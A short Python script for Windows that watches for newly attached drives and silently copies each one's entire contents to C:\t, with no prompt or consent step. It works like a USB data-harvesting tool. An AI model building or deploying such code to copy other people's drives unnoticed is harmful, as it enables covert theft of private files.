import string
from ctypes import windll
import time
import shutil
import os

def copytree(src, dst, symlinks=False, ignore=None):
    print(os.listdir(src))

    for item in os.listdir(src):
        if item == 'System Volume Information':
            continue

        s = os.path.join(src, item)
        d = os.path.join(dst, item)
        if os.path.isdir(s):
            shutil.copytree(s, d, symlinks, ignore)
        else:
            shutil.copy2(s, d)
        print("Copying")


def get_drives():
    drives = []
    bitmask = windll.kernel32.GetLogicalDrives()
    for letter in string.ascii_uppercase:
        if bitmask & 1:
            drives.append(letter)
        bitmask >>= 1

    return drives

prev_drive = get_drives()

def copy_drive(drive):
    copytree(drive+":\\", "C:\\t")

while(True):
    # print(prev_dirve)
    current_drive = get_drives()
    # print(current_drive)

    # Checks for new drive and if detected copy files
    new_drive = None
    for drive in current_drive:
        if drive not in prev_drive:
            new_drive = drive
            copy_drive(drive)

    prev_drive = current_drive



    print("waiting...")
    time.sleep(1)
